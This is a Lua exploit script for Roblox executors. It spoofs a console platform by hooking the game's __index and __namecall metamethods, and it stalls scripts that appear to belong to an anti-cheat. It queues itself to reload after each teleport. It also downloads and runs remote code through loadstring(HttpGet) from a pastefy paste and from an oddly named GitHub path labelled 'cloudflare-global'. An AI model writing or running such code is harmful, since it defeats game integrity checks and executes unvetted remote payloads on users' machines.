local CONSOLE_QOT_FILE = "experiment_console_qot.lua"

--[[
  Hub (10179538382): namecall is safe during queue_on_teleport.
  PC / Console places: must run Hyphon emulator first, then namecall.
  Early console stay = GuiService hookfunction only (no namecall).
]]
local CONSOLE_QOT_PAYLOAD = [[
local HUB_PLACE = 10179538382
local PC_PLACE = 13643807539
local CONSOLE_PLACE = 15124180230
local QOT_FILE = "experiment_console_qot.lua"
local HYPHON_URL = "https://pastefy.app/DdpWWNDc/raw"

local function get_queue()
    return queue_on_teleport
        or (syn and syn.queue_on_teleport)
        or (fluxus and fluxus.queue_on_teleport)
        or (secure_load and secure_load.queue_on_teleport)
        or KRNL_QUEUE_ON_TELEPORT
end

local qt = get_queue()
if qt and (game.PlaceId == HUB_PLACE or game.PlaceId == CONSOLE_PLACE) then
    qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
end

-- Safe without Hyphon: keeps you on console without touching __namecall.
local function apply_safe_console_spoof()
    if getgenv().__ExperimentSafeConsoleSpoof then
        return
    end
    getgenv().__ExperimentSafeConsoleSpoof = true

    local GuiService = game:GetService("GuiService")
    local UserInputService = game:GetService("UserInputService")

    pcall(function()
        local OldIsTenFootInterface
        OldIsTenFootInterface = hookfunction(GuiService.IsTenFootInterface, newcclosure(function(self)
            if not checkcaller() then
                return true
            end
            return OldIsTenFootInterface(self)
        end))
    end)

    local oldIndex
    oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, index)
        if checkcaller() then
            return oldIndex(self, index)
        end
        if self == UserInputService and tostring(getcallingscript()) ~= "ControlModule" then
            if index == "TouchEnabled"
                or index == "MouseEnabled"
                or index == "KeyboardEnabled" then
                return false
            elseif index == "GamepadEnabled"
                or index == "ControllerEnabled" then
                return true
            end
        end
        return oldIndex(self, index)
    end))
end

-- Hub-only namecall (safe on queue_on_teleport / hub).
local function apply_hub_namecall()
    if getgenv().__ExperimentHubNamecall then
        return
    end
    getgenv().__ExperimentHubNamecall = true

    local OldNamecall
    OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local Method = getnamecallmethod()

        if Method == "IsTenFootInterface" then
            return true
        elseif Method == "GetPlatform" then
            return Enum.Platform.XBoxOne
        end

        local Traceback = debug.traceback()
        if Traceback:match("PlayerGui") then
            local lp = game:GetService("Players").LocalPlayer
            local SourceName = Traceback:gsub(
                string.format("Players.%s.PlayerGui.", lp.Name),
                ""
            )
            if SourceName:len() > 32 then
                return task.wait(9e9)
            end
        end

        return OldNamecall(self, ...)
    end))
end

-- Game-place namecall: ONLY after HyphonReady (no Traceback hang).
local function apply_game_namecall()
    if getgenv().__ExperimentGameNamecall then
        return
    end
    getgenv().__ExperimentGameNamecall = true

    local OldNamecall
    OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local Method = getnamecallmethod()

        if Method == "IsTenFootInterface" then
            return true
        elseif Method == "GetPlatform" then
            return Enum.Platform.XBoxOne
        end

        return OldNamecall(self, ...)
    end))
end

local function emulate_hyphon()
    if getgenv().HyphonReady == true then
        return true
    end

    local ok = pcall(function()
        loadstring(game:HttpGet(HYPHON_URL))()
        repeat task.wait() until getgenv().HyphonReady == true
    end)

    return ok and getgenv().HyphonReady == true
end

apply_safe_console_spoof()

if game.PlaceId == HUB_PLACE then
    -- Hub: namecall is safe here.
    apply_hub_namecall()
    game:GetService("ScriptContext"):SetTimeout(1)

    local HyphonScript = nil
    local function FindHyphonScript()
        for _, Object in pairs(getnilinstances()) do
            if Object:IsA("Script") and Object.Name:len() == 32 then
                HyphonScript = Object
            end
        end
    end
    repeat
        FindHyphonScript()
        task.wait()
    until HyphonScript

    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/asdwasd.lua"))()
    end)

    qt = get_queue()
    if qt then
        qt("loadstring(readfile('" .. QOT_FILE .. "'))()")
    end

elseif game.PlaceId == PC_PLACE or game.PlaceId == CONSOLE_PLACE then
    -- Stay joined with safe spoof first; Hyphon before any __namecall.
    repeat task.wait() until game:IsLoaded()

    if game.PlaceId == PC_PLACE then
        repeat task.wait() until not game.ReplicatedFirst:FindFirstChild("Intro")
        game:GetService("ScriptContext"):SetTimeout(9e9)
    end

    if emulate_hyphon() then
        apply_game_namecall()
    else
        warn("join Console | Hyphon emulator failed; skipped namecall hook")
    end
end
]]
